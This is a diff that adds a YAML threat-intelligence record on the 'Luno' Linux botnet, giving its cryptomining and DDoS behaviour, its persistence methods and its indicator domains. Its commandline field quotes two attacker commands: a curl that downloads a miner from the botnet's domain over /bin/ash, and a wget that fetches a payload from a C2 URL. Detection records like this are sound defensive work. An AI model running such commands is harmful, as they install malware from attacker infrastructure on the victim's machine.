@@ -1,0 +1,47 @@
+description: "Linux botnet Luno combines cryptomining and modular DDoS capabilities\
+  \ with self\u2011healing watchdogs and binary replacement."
+attribution: Uncertain; possible threat actor selling DDoS services via Telegram channel.
+malware_families:
+- Luno
+- LunoC2
+TTPs:
+  processes:
+  - bash
+  - ash
+  - system
+  commandline:
+  - '''curl -sLo /bin/ash https://main.botnet.world/xmrig'''
+  - '''wget -qO /tmp/.sh_updXXXXXX <C2_URL>'''
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: ash
+    destination: supportxmr.com
+    port: 3333
+  - executable: ash
+    destination: botnet.world
+    port: null
+  file_activity:
+  - /bin/ash
+  - /usr/bin/<binary>
+  - ss
+  persistence:
+  - watchdog loop with process respawning
+  - binary replacement in /usr/bin/
+  - "self\u2011update via wget and mkstemp"
+  - "setsid used for session detachment during self\u2011destruct"
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 111.0.0.2
+  domains:
+  - botnet.world
+  - main.botnet.world
+  - supportxmr.com
+  urls: []
+reference: https://cyble.com/blog/lunobotnet-a-self-healing-linux-botnet/
+date_of_publication: September 09, 2025
+file_creation_date: September 09, 2025
